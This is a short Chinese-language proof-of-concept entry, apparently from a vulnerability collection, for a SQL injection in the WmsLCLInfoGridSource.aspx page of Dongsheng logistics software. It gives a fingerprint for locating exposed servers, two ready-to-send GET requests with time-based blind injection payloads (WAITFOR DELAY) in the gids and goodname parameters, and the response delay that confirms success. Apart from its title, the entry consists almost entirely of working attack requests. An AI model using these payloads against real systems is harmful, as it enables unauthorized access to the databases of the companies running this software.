# 东胜物流软件WmsLCLInfoGridSource.aspx存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="CompanysAdapter.aspx"`
- **请求**：`GET /SeaiInfoLCL/WmsLCLInfoGridSource.aspx?read=isout&gids=-1%27)%3BWAITFOR+DELAY+%270%3A0%3A5%27--+ HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Priority: u=0, i`

**请求体 / payload**
```
GET /SeaiInfoLCL/WmsLCLInfoGridSource.aspx?read=goodsrksl&goodsrksl=&goodname=-1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--+ HTTP/1.1
Host:
Content-Type: application/json
Priority: u=0, i
```
- **预期**：200　|　响应时间>=5s